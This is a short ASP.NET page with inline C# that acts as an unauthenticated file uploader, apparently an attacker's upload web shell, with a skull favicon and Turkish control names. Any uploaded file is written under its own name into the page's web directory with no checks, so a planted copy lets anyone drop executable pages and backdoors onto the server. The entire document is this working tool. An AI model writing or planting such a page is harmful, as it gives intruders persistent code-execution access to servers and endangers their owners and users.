<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

    protected void btnGonder_Click(object sender, EventArgs e)
    {
        if (uplDosya.HasFile)
        {
            uplDosya.SaveAs(Server.MapPath(".") + "\\" + uplDosya.FileName);
        }
        else
            Response.Write("Upload edilecek dosya yok");
    } 

</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
    <head runat="server">
        <title>R&#3588;&#3628;&#10003;</title>
		<link href="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/237/skull_1f480.png" rel=icon type="image/x-icon"/>
    </head>
<body>
    <form id="form1" runat="server">
        <div>
 <span style='font-size:20px;'>: </span><asp:FileUpload ID="uplDosya" runat="server" />
            <br />
            	&#10149; <asp:Button ID="bntGonder" runat="server" Text="Uploadr &#10004;" OnClick="btnGonder_Click" />
        </div>
    </form>
</body>
</html>
